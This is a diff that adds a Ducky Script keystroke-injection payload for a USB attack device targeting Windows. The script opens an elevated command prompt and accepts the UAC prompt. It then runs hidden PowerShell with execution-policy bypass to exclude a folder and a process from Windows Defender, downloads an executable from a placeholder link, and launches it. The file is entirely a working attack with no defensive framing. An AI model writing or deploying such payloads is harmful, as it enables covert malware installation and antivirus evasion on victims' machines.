@@ -1,0 +1,16 @@
+DELAY 700
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -VERB runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 700
+STRING mkdir C:\tmp
+ENTER
+DELAY 200
+STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Add-MpPreference -Force -ExclusionPath "C:\tmp"}; Invoke-WebRequest -Uri 'https://<link>' -Outfile 'C:\tmp\install.exe'; Add-MpPreference -ExclusionProcess -Force 'C:\tmp\install.exe'; Start-Process -FilePath 'C:\tmp\install.exe'
+ENTER
+DELAY 1000
+STRING exit
+ENTER
